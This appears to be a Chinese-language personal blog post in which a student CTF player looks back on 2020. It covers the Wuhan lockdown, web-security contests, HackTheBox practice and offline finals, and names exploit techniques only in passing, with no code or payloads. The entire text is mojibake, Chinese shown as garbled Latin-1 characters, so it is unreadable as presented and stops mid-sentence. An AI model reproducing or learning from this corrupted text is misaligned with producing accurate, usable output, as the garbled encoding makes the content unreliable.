1.16å›æ­¦æ±‰äº†ï¼Œå¥½åƒå›å»ç¬¬ä¸€å¤©å°±æŠŠç”µè„‘æ³¼äº†æ°´å¯¼è‡´ç”¨ä¸äº†äº†ã€‚ã€‚ã€‚ç„¶åè·Ÿè€çˆ¸å»ä¿®ç”µè„‘é¡ºä¾¿åƒäº†å›çƒ§çƒ¤ã€‚åé¢çš„äº‹å°±ä¸ç”¨è¯´äº†ï¼Œç–«æƒ…çªç„¶çˆ†å‘ï¼Œæ­¦æ±‰è¿˜ååæ˜¯æ ¸å¿ƒåœ°åŒºï¼Œç›´æ¥å°åŸã€‚æˆ‘ä»¬ä¹Ÿåªèƒ½å‘†åœ¨å®¶é‡Œåšå¥½è‡ªæˆ‘é˜²æŠ¤ã€‚ å®è¯è¯´ï¼Œé‚£æ®µæ—¶é—´çš„ç¡®æœ‰äº›äººå¿ƒæƒ¶æƒ¶ã€‚èº«è¾¹äººåæ˜ å‡ºçš„åŒ»é™¢ä¹±è±¡è¿œæ¯”æŠ¥é“çš„æƒŠäººï¼Œå†è€…ï¼Œæ–°å† å¨åŠ›ç¡®å®æƒŠäººï¼Œæ¯å¤©çœ‹åˆ°é‚£äº›æ•°å­—çš„å¢åŠ ï¼Œå¿ƒé‡ŒçœŸçš„ä¸æ˜¯æ»‹å‘³ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½é»˜é»˜ç¥ˆç¥·ç–«æƒ…èµ¶å¿«è¿‡å»ã€‚ ç„¶è€Œåœ¨å®¶çš„æœ€å¤§å¥½å¤„å°±æ˜¯å¯ä»¥å°½æƒ…æ‰“ctfäº†ã€‚æœ¬æ¥å¤§äºŒä¸Šè¯¾å¤šåˆ°è‡ªå·±æ ¹æœ¬æ²¡æ—¶é—´å»å­¦ä¹ ï¼Œå»è®¤çœŸåšå‡ é“é¢˜ç›®ã€‚ç°åœ¨å®…åœ¨å®¶é‡Œçš„ç¡®å¾ˆé€‚åˆç›¯ç€ç”µè„‘ï¼Œå­¦äº›æ„Ÿå…´è¶£çš„çŸ¥è¯†æˆ–è€…å¤ç°å‡ é“é¢˜ç›®äº†ã€‚æ°å¥½vidar-teamå¸ˆå‚…ä»¬ä¸¾åŠäº†hgameï¼Œäºæ˜¯å°±åˆå®šäº†ä¸ªå°ç›®æ ‡ï¼šå°½é‡ak æ‰æ¯å‘¨çš„web.(ç»“æœåˆ°week3å°±akä¸äº†orz.xssæ²¡åšå‡ºæ¥) ç„¶åå¥½åƒå°±å»æ‰“äº†å‡ å¤©æ•°æ¨¡ï¼Œæ°´äº†ç¯‡ç¾èµ›è®ºæ–‡ã€‚å½“æ—¶è‡ªå·±åŸºæœ¬å°±æŒ‰æ‰˜ç¦ä½œæ–‡çš„ä¸€äº›å¥—è·¯å†™çš„ï¼Œæœ€åå†™å‡ºæ¥æœ‰äº›å†…å®¹ä¸å¿ç›´è§†ã€‚ã€‚ã€‚å»ºæ¨¡ä¹Ÿæ˜¯çå»ºçš„ã€‚æœ€åå±…ç„¶æ··äº†ä¸ªHå¥–ï¼Ÿï¼Ÿäºæ˜¯æœæ–­å¼ƒå‘æ•°æ¨¡ï¼Œå¤ªç„å­¦äº†ã€‚ ç„¶åç¬¬ä¸€æ¬¡æ‰“æ¯”è¾ƒå®Œæ•´çš„ctfåº”è¯¥å°±æ˜¯é‚£ä¸ªæ–°æ˜¥æˆ˜å½¹äº†ã€‚ icqæ–°æ˜¥æˆ˜å½¹åº”è¯¥æ˜¯è‡ªå·±å¤´ä¸€æ¬¡æ„Ÿè§‰è‡ªå·±å¯’å‡çš„ä»˜å‡ºæ²¡ç™½è´¹ã€‚åƒæˆ‘è¿™ç§å¤©èµ‹æ¯”è¾ƒå·®çš„ï¼Œä¸€å¼€å§‹å­¦webåªèƒ½çº¯é åˆ·é¢˜ã€‚æœ€åèƒ½åšå‡ºå¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„ ç„¶åå°±æ˜¯çªå¦‚å…¶æ¥çš„å…¥é˜Ÿé¢˜ï¼Œä¸€é“åŸå‹é“¾æ±¡æŸ“+rogue mysql ä»»æ„è¯»ã€‚æ±¡æŸ“è›®ç®€å•çš„ï¼Œrogue mysql å½“æ—¶æ²¡æ¥è§¦è¿‡ä¸€è„¸æ‡µé€¼ï¼Œä¸è¿‡åæ¥ç»™äº†å‚è€ƒèµ„æ–™çœ‹å°±èƒ½åšäº†ã€‚ 3æœˆä»½ï¼Œxctfé«˜æ ¡æˆ˜å½¹ï¼Œè‡ªå·±ç»ˆäºç¬¬ä¸€æ¬¡èƒ½è·Ÿx1cçš„ä¼™ä¼´ä»¬ä¸€èµ·åšé¢˜äº†ã€‚ç„¶è€Œç¬¬ä¸€æ¬¡æ‰“xctfè¿™ç§è§„æ¨¡çš„æ¯”èµ›æ—¶è¿˜æœ‰äº›ä¸é€‚åº”ï¼Œå¥½å‡ é“é¢˜éƒ½æ˜¯åªä¼šåšä¸€éƒ¨åˆ†ï¼Œå´ä¸èƒ½å®Œæ•´çš„åˆ©ç”¨ã€‚å”¯ä¸€ä¸€ä¸ªå‡ ä¹èƒ½å®Œæ•´åšå®Œçš„webé¢˜æœ€åä¸€æ­¥åˆ©ç”¨ä¸äº†ã€‚ã€‚ã€‚æ‰€ä»¥è¯´å½“æ—¶æœ‰ç‚¹å°æŒ«æŠ˜å§ã€‚äºæ˜¯å°±å»buuåˆ·é¢˜äº† æ¥ä¸‹æ¥å‡ ä¸ªæœˆå¯ä»¥è¯´åŸºæœ¬å°±æ˜¯å¸¸è§„åŒ–æ“ä½œï¼šä¸Šç½‘è¯¾ï¼Œå†™ä½œä¸šï¼Œåˆ·buuï¼Œæ°´åšå®¢ã€‚ç„¶åè§„æ¨¡ç›¸å¯¹å¤§ç‚¹çš„æ¯”èµ›å°±å»æ‰“ä¸€æ‰“ï¼Œctftimeä¸Šæ‰¾äº›å›½é™…èµ›çš„æœ‰è¶£é¢˜ã€‚ç»ˆäºbuué‚£è¾¹ä¸çŸ¥ä¸è§‰åˆ·åˆ°äº†webæ¦œä¸€ï¼Œxctfä¹ŸåŸºæœ¬èƒ½åš1ï¼Œ2ä¸ªweb.ä¸è¿‡æ¯”è¾ƒçœ‹é‡çš„æ¯”èµ›å°±ç›´æ¥æ— ç¼˜äº†ã€‚ã€‚ã€‚ 6-8æœˆè¿™æ®µæ—¶é—´å°±æ¯”å¤æ‚å§ï¼Œå› ä¸ºå®è¯è¯´æ²¡ä»€ä¹ˆäº§å‡ºã€‚è‡ªå·±åŸºæœ¬å°±æ¯å¤©æ‰¾hacktheboxä¸Šçš„é¶æœºåšã€‚å¼€å§‹æ˜¯åªèƒ½æŒ‰ç…§wp,åšäº›é€€å½¹é¶æœºã€‚åæ¥å°è¯•äº†ä¸‹ç°å½¹çš„é¶æœºï¼Œæ„å¤–å‘ç°è¿˜èƒ½ä¸Šæ‰‹ï¼Ÿäºæ˜¯ä»ç®€å•ï¼Œåˆ°å›°éš¾ï¼Œåˆ°insaneéš¾åº¦éƒ½æœ‰å°è¯•ã€‚æœ‰æ—¶å€™ä¼šå› ä¸ºæ²¡æœ‰æ€è·¯å¡åœ¨ä¸€ä¸ªåœ°æ–¹å¾ˆä¹…å¾ˆä¹…ï¼Œåªèƒ½åœ¨htbè®ºå›ä¸Šæ‰¾å¤–å›½å‹äººæ±‚æŒ‡ç‚¹ã€‚æ¯”è¾ƒæ¬£æ…°çš„æ˜¯ï¼Œå¤§å®¶éƒ½å¾ˆä¹æ„ç»™æˆ‘ä¸€äº›æç¤ºï¼Œå¹¶åœ¨è‡ªå·±åšå‡ºæ¥åé“å£°ç¥è´ºã€‚æ‰€ä»¥è¯´æœ‰é—®é¢˜ä¸€å®šè¦å¤§èƒ†é—®å‘€ï¼ŒåŒæ—¶ä¹Ÿéå¸¸æ„Ÿè°¢é‚£äº›ç»™è¿‡æˆ‘å¸®åŠ©çš„äºº ä¸è¿‡è¿™æ®µæ—¶é—´ä¹Ÿæœ‰äº›å°éƒé—·ï¼Œå› ä¸ºå‡ æ¬¡xctf webå‡ ä¹éƒ½æ²¡äººè¾“å‡ºäº†ã€‚å­¦å¼Ÿä»¬å½“æ—¶è¿˜æ²¡å…¥é˜Ÿï¼Œæ¯æ¬¡å„ç§æ¯”èµ›çœ‹webéƒ½åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªï¼Œæ²¡äººå¸®åŠ©ã€‚é‚£æ—¶å€™åæ¬¡ä¹Ÿéƒ½ä¸è¡Œï¼Œæ„Ÿè§‰è‡ªå·±ä¸€ä¸ªäººæ ¹æœ¬æ²¡æ³•carryã€‚cybricsè·Ÿwmctfæ›´æ˜¯æ„Ÿè§‰å°ç»¿è‰éƒ½æ²¡äººæ‰“äº†ï¼ˆåæ¥æ‰çŸ¥é“æ˜¯wmctfæ˜¯å»æ”¯æ´suäº†ï¼‰ã€‚æ€»ä¹‹pushäº†ä¸€ä¸‹å°±å†³å®šwebè¿™è¾¹æå‰è€ƒæ ¸äº†ã€‚ æ‰€ä»¥è¯´ï¼Œè¿™æ®µæ—¶é—´æ²¡ä»€ä¹ˆäººæ‰“x1cå¯¹æˆ‘æ¥è¯´æœ‰äº›æ¨è¿›çš„ä½œç”¨çš„ï¼Œæˆ‘ä¼šæ›´åŠ é€¼è¿«è‡ªå·±å»å¤šå­¦äº›å†…å®¹ï¼Œä¸ç„¶ç°æœ‰çš„å®åŠ›æ ¹æœ¬ä¸å¤Ÿã€‚ çœŸæ­£æœ‰æ‰€æ”¹è§‚çš„æ˜¯8æœˆä»½æœ«äº†ã€‚æœ€æ—©å¼€å§‹æ˜¯å¤©ç¿¼æ¯,çº¿ä¸Šé ç¥¥å“¥carryè¿›final,ç„¶åfinalæ„å¤–çš„æ‰“åˆ°äº†äºŒç­‰å¥–ã€‚è®©æˆ‘è§‰å¾—è‡ªå·±æš‘å‡htbåšçš„è¿˜æ˜¯æŒºæœ‰ç”¨çš„hhh.ä¹‹åæ‰“äº†å›½èµ›ï¼Œæ‰“äº†é’“é±¼åŸï¼Œæ‰“äº†å¼ºç½‘æ¯ã€‚æˆ‘çš„åšé¢˜çŠ¶æ€ä¹Ÿä»æ»¡çŠ¶æ€åˆ°å¼€å§‹æ‘¸äº†ï¼ˆå…¶å®æ˜¯å› ä¸ºqwbéš¾åº¦æ¯”è¾ƒé«˜ï¼‰ã€‚ 9æœˆä»½è¿”æ ¡ï¼Œå…ˆæ˜¯è¡¥ä¹‹å‰çš„æœŸæœ«è€ƒã€‚ä¸å¾—ä¸è¯´å› ä¸ºç½‘è¯¾è‡ªå·±çš„æ•ˆç‡ç¡®å®ä¸‹é™äº†ï¼Œè€ƒè¯•ä¸åƒä»¥å‰é‚£æ ·å¾—å¿ƒåº”æ‰‹ã€‚ä¸­é—´ç”µå·¥ç”µå­å› ä¸ºæ’ä¸Šå›½èµ›åˆ†åŒºèµ›è¿˜ç¼“è€ƒäº†ã€‚ï¼ˆä¸è¿‡æœ€åè¿˜æ˜¯95,è¿˜æ˜¯æŒºæ»¡æ„çš„ï¼‰ å›½èµ›åˆ†åŒºèµ›å°±æŒºæƒŠå¿ƒåŠ¨é­„äº†ã€‚å½“æ—¶æˆ‘ä»¬è¿™è¾¹ä¸¤ä¸ªå­¦å¼Ÿå»é’“é±¼åŸäº†ï¼Œåˆ†åŒºèµ›å°±åŒäººæ‰“ã€‚pwnçˆ·è¿˜å› ä¸ºè€ƒè¯•åªèƒ½æ‰“ç¬¬ä¸€å¤©ä¸Šåˆã€‚ä¸è¿‡å°±ç®—è¿™æ ·ï¼Œç¬¬ä¸€å¤©å¼€åœºä¸€ä¸ªåŠå°æ—¶è‡ªå·±å°±æŠŠå½“æ—¶web akäº†ï¼ˆä¸è¿‡æ¯”ä¸äº†rmbï¼‰ã€‚æ‹¿äº†1ä¸ªå¼±æ™ºä¸€è¡€è·Ÿä¸¤ä¸ª2è¡€ã€‚è¿›å…¥æŠ–è…¿çœ‹æ¦œé˜¶æ®µã€‚ç„¶è€Œæ²¡æœ‰pwnçœŸçš„ä¼¤â€¦â€¦ç¬¬äºŒå¤©æ›´æ˜¯å› ä¸ºåªæœ‰æˆ‘ä¸€ä¸ªäººå•æŒ‘ï¼Œå¿ƒæ€è´¼å·®ã€‚å½“æ—¶ä¸€ä¸ªä¸æ˜¯å¾ˆéš¾çš„pgsqléƒ½æ²¡åšå‡ºæ¥ã€‚æ€»ä¹‹ç¬¬äºŒå¤©æ¯”å®Œåæ€»æ„Ÿè§‰æ€»å†³èµ›æ²¡æˆäº†ï¼Œæ„Ÿè§‰åˆè¦é”™è¿‡å›½å­—å¤´æ¯”èµ›äº†â€¦â€¦ä¸è¿‡æœ€åå±…ç„¶ç¬¬7è¿›äº†ï¼Ÿæ„Ÿè°¢fmyyå…‰é€Ÿåšpwnæ•‘äº†æˆ‘ä»¬ ç„¶åå°±æ˜¯å›½èµ›çº¿ä¸‹ï¼Œåœ¨æ­¦æ±‰æ¯”+å›½åº†å‡æœŸã€‚æˆ‘ç›´æ¥å¸¦ä¸Šè¡Œæå°±èƒ½å›å®¶ä¼‘å‡233ã€‚ ä¸è¿‡æˆ‘ä»¬æ¬¢è¿å¦¹å­æ‰“ç”µè¯é¦–æ¬¡â€å‡ºå¾â€ä½“éªŒæå·®ã€‚åªå»äº†ä¸‰ä¸ªäººï¼Œfmyyæ‰“è¿‡ä¸€æ¬¡çº¿ä¸‹ï¼Œå‰©ä¸‹ä¸¤ä¸ªéƒ½æ˜¯ç¬¬ä¸€æ¬¡ã€‚ç¬¬ä¸€å¤©adç›´æ¥è¢«æš´æ‰“ã€‚æˆ‘ç›´åˆ°1ç‚¹é’Ÿæ‰èƒ½è®¿é—®åˆ°åˆ«äººé¶æœºï¼ˆé‚£æ—¶å€™å¹³å°å·²ç»ç‚¸äº†ï¼Œåˆ†éƒ½æ²¡äº†ï¼‰ï¼Œåœ¨æ­¤ä¹‹å‰éƒ½åªèƒ½è¢«åŠ¨ä¿®é¢˜æŒ¨æ‰“,æŠ“æµé‡éƒ½æ²¡æ³•å¤ç°å‡ºå»ã€‚ã€‚ã€‚ æ‰€ä»¥è¯´ylb sbä¸æ˜¯æ²¡æœ‰é“ç†çš„ã€‚æˆ‘ç¬¬ä¸€æ¬¡ä½“éªŒå°±è¿™ä¹ˆå·®çœŸå¾—ä¸€ç”Ÿé»‘ ç¬¬äºŒå¤©æ”¹è§£é¢˜ä¹Ÿæƒ¨æƒ¨ï¼Œå°±åšäº†ä¸ªwebçš„åŸå‹é“¾æ±¡æŸ“æ¸¸æˆé¢˜ã€‚web3å½“æ—¶å±…ç„¶å¿˜äº†é€ƒé€¸äº†ï¼Œå¯èƒ½äººè¢«ylbè¿·æƒ‘å‚»äº†å§ã€‚æ€»ä¹‹ç¬¬ä¸€æ¬¡å›½èµ›å°±è‰è‰ç»“æŸäº†ã€‚å¹¸å¥½X1cteamä»–ä»¬æ‹¿äº†å›½ä¸€ï¼Œä¸äºã€‚æ™šä¸Šå»æŠ½å¥–æ›´è¿·ï¼Œ%60+çš„ä¸­å¥–ç‡æˆ‘å®Œç¾é”™è¿‡ã€‚çœ‹æ¥å¤©ç”Ÿæ²¡è¿™ä¸ªè¿æ°” å†é—®å€™ä¸€éylb ç¬¬äºŒæ¬¡çº¿ä¸‹æ˜¯å·…å³°æå®¢ã€‚æ²¡è®°é”™çš„è¯å»å·…å³°æå®¢ä¹‹å‰æ˜¯bytectfçš„çº¿ä¸Šã€‚ç„¶åå°±æ˜¯ctfç”Ÿæ¶¯æ°¸è¿œçš„ç—›â€“easyscrapyï¼Œåˆ©ç”¨é“¾æ‘¸æ¸…äº†ç»“æœå› ä¸ºèµ¶é£æœºæ²¡èƒ½æ¯”èµ›ä¸­è§£å‡ºã€‚ã€‚ã€‚å¥½åœ¨ä¸å½±å“è¿›çº¿ä¸‹ã€‚ æ¯”èµ›å‰ä¸€å¤©åœ¨æˆéƒ½è·Ÿé˜Ÿå‹ä»¬æ°ç«é”…ã€‚ä¸­åˆåƒçš„æ—¶å€™ä¸è§‰å¾—å¾ˆè¾£ï¼Œç»“æœèƒƒå‘Šè¯‰æˆ‘ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ XP .å½“å¤©æ™šä¸Šç›´æ¥ä¸æ•¢ç¢°è¾£é”…äº†ã€‚è¿˜å¤´ä¸€æ¬¡è§åˆ°æˆéƒ½çš„ä¸‰é²œé”…å±…ç„¶æ˜¯è¾£/ç•ªèŒ„/æ¸…æ±¤ã€‚ä½©æœä½©æœ ç¬¬äºŒå¤©æ¯”èµ›å‘ç°huashuiteamåœ¨æˆ‘å¯¹é¢ï¼Œæ‹äº†ä¸‹ylg æœ€åæ‹¿åˆ°å¥–æ¯è›®å¼€å¿ƒçš„ï¼Œæ¯•ç«ŸçœŸçš„å¥½ä¹…æ²¡äº§å‡ºäº† æ™šä¸Šçœ‹äº†çœ¼IFSä¸Šçš„ç†ŠçŒ«~ æ„Ÿè§‰æˆéƒ½è¿™ä¸ªåŸå¸‚è¿˜æ˜¯æŒºä¸é”™çš„ã€‚ä¸è¿‡å‰ææ˜¯èƒ½æ‰¿å—çš„çš„å·®å¼‚ã€‚æ¯•ç«Ÿè¿™é‡Œèµ°å‡ æ­¥å°±èƒ½çœ‹è§ä¸€å®¶åŒæµå…”å¤´ å·…å³°æå®¢æ¯”å®Œå›æ¥å†³å®šæ¢ç”µè„‘äº†ã€‚ä¹‹å‰çš„ç”µè„‘å¤ªå¡äº†ï¼Œå¯¼è‡´æ¯”èµ›æ—¶è™šæ‹Ÿæœº+2ä¸ªideå°±å¡æˆshiï¼Œæ€å‰æƒ³åæ¢äº†huawei matebook14.ä¸»è¦æ˜¯çœ‹é‡äº†æ€§ä»·æ¯”ï¼Œç„¶åè‡ªå·±åçˆ±è½»è–„æœ¬ï¼ŒåŠ ä¸Šä¸æ‰“æ¸¸æˆï¼Œæ€§èƒ½ç»å¯¹å¤Ÿç”¨äº†ã€‚è‡³äºmacå°±ç­‰ä»¥åè‡ªå·±éœ€è¦ç”Ÿäº§åŠ›æ—¶å†æé’±ä¹°å§ XD ç„¶åå¥½åƒæ˜¯XNUCAçš„çº¿ä¸Šæ¥äº†ï¼Œæˆ‘åˆä¸€æ¬¡çˆ†é›¶ã€‚ã€‚ã€‚yysy oooooldjsè¿™é¢˜æŒºå¯¹æˆ‘èƒƒå£çš„ã€‚æˆ‘å½“æ—¶è°ƒè¯•äº†å¥½ä¹…ä¹Ÿæ˜¯æ‰¾åˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„åœ°æ–¹å´æ²¡æ³•æ±¡æŸ“ï¼Œå§‹ç»ˆæ²¡æ‰¾åˆ°bypassçš„æ–¹æ³•ã€‚ç»“æœèµ›åæ²¡æƒ³åˆ°æ±¡æŸ“è¿˜åªæ˜¯è¿™é¢˜çš„ç¬¬ä¸€æ­¥orz. ä¹‹åæ˜¯è¥¿æ¹–è®ºå‰‘çš„çº¿ä¸‹ï¼Œæ¬¢è¿å¦¹å­æ‰“ç”µè¯å†æ¬¡å‡ºæˆ˜ fmyy yyds.ç¥¥å“¥ yyds. ç›´æ¥æ‰“åˆ°ç¬¬7è„±ç¦»ä½ä¿ã€‚ç„¶åå¤§è…¿åœ¨ç™½æ³½å¤ºå† ï¼Œylg+éª‘é©´ä»–ä»¬huashuiteam ç¬¬äºŒã€‚æˆ‘ä»¬ç¬¬7,x1cæœ‰ä½ä¿ã€‚rrråœ¨ioté‚£ä¹Ÿæ‹¿äº†é’±ã€‚æ„Ÿè§‰æ–°/è€ç»¿è‰æŠ¢äº†ä¸å°‘é’± 2333 å›å¤´å¤ç°äº†ä¸‹æ²¡åšå‡ºæ¥çš„web,æ„Ÿè§‰å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è°ƒè¯•è¿˜æ˜¯æŒºé‡è¦çš„ã€‚ ç„¶ånctf2020 æˆ‘å‡ºé¢˜ã€‚å…¶å®é™¤å¼€å›½èµ›ä»¥å¤–è‡ªå·±åŸºæœ¬å°±æ²¡æ€ä¹ˆæŠŠå‡ºå¥½çš„é¢˜å–ç»™å…¶ä»–å¹³å°ã€‚å› ä¸ºæˆ‘è§‰å¾—é«˜è´¨é‡çš„é¢˜æœ€å¥½èƒ½æ”¾è‡ªå·±å®¶çš„æ¯”èµ›ï¼Œæ¥åˆ†äº«çŸ¥è¯†ã€‚æ¯•ç«Ÿctfçš„ç›®çš„ä¸€ä¸ªæ˜¯have funï¼Œå¦ä¸€ä¸ªå°±æ˜¯èƒ½ä»é¢˜ç›®ä¸­æ”¶è·ä¸€äº›å¯¹ç°å®çœŸå®ç¯å¢ƒåˆ©ç”¨çš„æ–¹æ³•ã€‚å› ä¸ºå¾ˆé•¿ä¸€æ®µæ—¶é—´è‡ªå·±ä¸»è¦æ˜¯ç ”ç©¶nodejs,æ‰€ä»¥å°±æŠŠè¿™äº›æˆ‘è‡ªæˆ‘è®¤ä¸ºèƒ½è®©äººæœ‰æ‰€æ”¶è·çš„çŸ¥è¯†ç‚¹éƒ½æ”¾åœ¨æ ¡èµ›äº†ã€‚ï¼ˆå­¦é•¿ä»¬çš„å¥–åŠ±å¤ªä¸°åšäº†ã€‚ã€‚ã€‚ï¼‰è€Œä¸”ç¡®å®ï¼Œä»å¸ˆå‚…ä»¬åšæˆ‘çš„é¢˜çš„è¿‡ç¨‹ä¸­æˆ‘ä¹Ÿçœ‹åˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ï¼ŒåŒ…æ‹¬ä¸€äº›éé¢„æœŸã€‚ ä¸¾ä¸ªä¾‹å­ã€‚package_managerä¸¤é“é¢˜æœ¬æ„æ˜¯åŸå‹é“¾æ±¡æŸ“æ‰“å­è¿›ç¨‹ã€‚ä¸è¿‡æœ‰äº›å¸ˆå‚…æ˜¯é æ—¥nunjucksåšå‡ºæ¥çš„ã€‚ç¡®å®æé†’äº†æˆ‘ä¸è¦ç›²ç›®ä¸è·Ÿæºç å°±é€‰æ¡†æ¶ã€‚æ›´æ„å¤–çš„æ˜¯æˆ‘ä»¬njuptçš„å¼€å‘dalaoç›´æ¥å¸®å¿™ä¿®å¤äº†è¿™ä¸ªé—®é¢˜233.è™½ç„¶ä¸æ˜¯0dayï¼Œä½†æ˜¯çš„ç¡®è§£å†³æ‰äº†nunjucksæ¨¡æ¿æ³¨å…¥çš„ä¸€ç§åˆ©ç”¨ã€‚ æœ€ååˆ°äº†12æœˆï¼Œxnucaçº¿ä¸‹ æœ¬æ¥æ˜¯æ‰“ç®—è¿‡å»æ¸—é€çš„ã€‚å¼€å§‹è¿˜æ‹…å¿ƒå·¥å…·æ˜¯ä¸æ˜¯æ²¡å‡†å¤‡å¥½ï¼Œç»“æœç°åœºçœ‹åˆ°èµ›åˆ¶ç›´æ¥å˜æˆå¼ºç½‘æ¯åŒæ¬¾git based AWD + KOHäº†ã€‚è€Œä¸”awdè¿˜æœ‰ä¸€åŠï¼ˆ2/4ï¼‰å…¶å®å°±æ˜¯è§£é¢˜â€¦â€¦åªèƒ½è¯´çœŸçš„ç¡¬æ ¸ï¼Œæ€»å…±å°±ä¸€é“è§£é¢˜webã€‚å…¶ä»–çš„éƒ½æ˜¯ç¡¬æ ¸pwn. ezwpæ€è·¯é”™äº†å°±ä¸€è„¸æ‡µé€¼ã€‚åé¢çŸ¥é“æ˜¯pharååºåˆ—åŒ–åæ„Ÿè§‰è¿˜è¡Œï¼Ÿæ€»ä¹‹è°ƒäº†ä¸‹æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡ç¡®å®æ„Ÿè§‰å¾—åˆ°è°ƒè¯•wordpressè¿™ç§æ¡†æ¶æºç æ¯”é‚£äº›æ¯”è¾ƒæ°´çš„cmséš¾å¤ªå¤šäº†ã€‚æ‰€ä»¥åé¢è‚¯å®šè¦ç ”ç©¶ä¸‹çš„ã€‚å½“ç„¶é…’åº—çš„è‡ªåŠ©åƒçš„çœŸèˆ’æœã€‚fmyyè·Ÿpsbç–¯ç‹‚å¹²é¥­ï¼Œfmyyå›æ¥ç§°ä½“é‡ç›´æ¥èƒ–äº†7æ–¤233 ç„¶åå›å—äº¬å‘†äº†ä¸€å¤©å°±åˆå»åŒ—äº¬æ‰“å­—èŠ‚äº† å•åˆ·äº†ä¸‰é“ctf webã€‚å¯æƒœå…¶ä»–æ–¹å‘éƒ½ä¸ä¼šï¼Œç›´æ¥ggã€‚adç¬¬äºŒå¤©é fmyyçš„ä¸€è¡€æ€»ç®—ä¸æ˜¯å¤ªéš¾çœ‹ã€‚ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œåˆæ˜¯è¢«miscæ”¯é…çš„æ—¥å­orz ä¸è¿‡å­—èŠ‚ç¡®å®æœ‰é’±ã€‚æ¥ä¹‹å‰çš„é›¶é£Ÿå¤§ç¤¼åŒ…è·Ÿæ¯”å®Œåçš„å¤§ç¤¼åŒ…çœŸçš„ä¸°åšã€‚ã€‚ã€‚è€Œä¸”æŠ¥é“é‚£å¤©æ™šä¸Šé€›çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†è®¡ç®—æ‰€/ç‰©ç†æ‰€/ç©ºå¤©ä¿¡æ¯ç ”ç©¶æ‰€ï¼Œä»¥åŠä¸€äº›äº’è”ç½‘å¤§å‚ã€‚åªèƒ½æ„Ÿæ…¨å¸éƒ½ç¡®å®æ˜¯å¸éƒ½ï¼Œå¤§å‚äº‘é›†ã€‚ä¹Ÿè®¸ä»¥åä¹Ÿæœ‰è¿‡å»å‘å±•çš„æ„æ„¿ æ‰“å®Œå­—èŠ‚å°±å†³å®šè¯¥æš‚æ—¶é€€å½¹äº†ã€‚ç»“æœä¸€å‘¨åæ‰‹ç—’è¿˜æ˜¯æ‰“äº†huaweiCTFçš„ç¬¬ä¸€åœºï¼Œwebå·®ä¸€é¢˜ak.æœç„¶è¿˜æ˜¯tcl.ä¹Ÿå¯èƒ½æ˜¯å•åˆ·webçš„è¯è„‘å­é¡¶ä¸ä½å§ï¼Œæ²¡æƒ³åˆ°cloudé‚£é¢˜æŒ‚å¥½ä»£ç†æ˜¯æ‰“fpm æ‰€ä»¥åä¸¤åœºå°±ä¸æ‰“äº†ã€‚æ¯•ç«Ÿè¿˜è¦å¤ä¹ æ¥ç€. ä¹‹åæ‰‹ç—’è¿˜æ˜¯çœ‹äº†åä¸¤åœºï¼Œé™¤äº†æœ€åä¸€åœºçš„ezloginéƒ½åšå‡ºæ¥äº†ï¼ŒåŸºæœ¬éƒ½æ˜¯å‰å‡ solve.çœ‹æ¥ç°åœ¨è§£é¢˜çš„çŠ¶æ€è¿˜ä¸é”™ï¼Ÿä½†æ˜¯è¯¥é€€å½¹è¿˜æ˜¯å¾—é€€å½¹çš„ çš„ç¡®å¯ä»¥è¯´ï¼Œ2020å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯åœ¨è·Ÿctfæ‰“äº¤é“ã€‚æˆ‘å¾ˆé«˜å…´èƒ½å¤Ÿé€‰æ‹©è¿™æ¡è·¯å¹¶ä¸”å‚ä¸å…¶ä¸­ã€‚æ— è®ºåšé¢˜/å‡ºé¢˜/ç ”ç©¶/è°ƒè¯•æŸä¸ªæ¼æ´çš„è¿‡ç¨‹ï¼Œéƒ½æ˜¯å……æ»¡è¶£å‘³çš„ã€‚é‡è¦çš„æ˜¯å­¦åˆ°äº†çŸ¥è¯†ï¼Œè¿™æ ·æ‰ä¸è‡´äºæ¯å¤©ç¢Œç¢Œæ— ä¸ºï¼Œæµªè´¹å¤§å­¦çš„å¤§å¥½æ—¶å…‰ã€‚æœ‰æ—¶å€™è™½ç„¶æ„Ÿè§‰å¿ƒé‡Œä¸å¹³è¡¡ï¼Œå› ä¸ºä¸ºç«èµ›ä»˜å‡ºçš„åŠªåŠ›æ‰€å¸¦æ¥çš„æˆæœå¹¶ä¸èƒ½ä¸å…¶ä»–åŒå­¦ä¾é å¯¼å¸ˆæ‰€æ‹¿åˆ°çš„ç§‘ç ”æˆæœç›¸æå¹¶è®ºã€‚ä½†æ˜¯è¿™ç§ä¸å¹³è¡¡åªæ˜¯æš‚æ—¶çš„ï¼Œæ—¢ç„¶é€‰æ‹©äº†è¿™æ¡è·¯ï¼Œå°±æ²¡æœ‰æ€€ç–‘å…¶æ­£ç¡®æ€§çš„å¿…è¦äº†ã€‚åšæŒèµ°ä¸‹å»å°±å¥½ å½“ç„¶2020è¿˜æ˜¯æœ‰äº›å°é—æ†¾çš„ï¼Œæ¯”å¦‚æŸäº›æ¯”èµ›æ²¡èƒ½å†²åˆ°å‰åˆ—ï¼Œæ¯”å¦‚å­¦ä¸šä¸Šæœ‰å‡ é—¨è€ƒè¯•ä¸å¤ªæ»¡æ„ï¼Œæ¯”å¦‚è¿˜æ˜¯ç»§ç»­å•èº«ç”Ÿæ´»ï¼ˆææ€•æœ¬ç§‘ç”Ÿæ¶¯è„±ä¸äº†å•äº†ï¼‰,æ¯”å¦‚æ²¡èƒ½åšæŒé”»ç‚¼â€¦â€¦ å¸Œæœ›æ˜å¹´èƒ½æœ‰æ‰€æ”¹è¿›å§ã€‚ æ€»çš„æ¥è¯´2020è¿˜æ˜¯æ”¶è·æ»¡æ»¡çš„ã€‚æ¯•ç«Ÿå›é¦–ä¸€çœ‹ï¼Œè‡ªå·±ä½œä¸ºä¸€åctferçš„ç¡®æ˜¯ä»ä¸€æ— 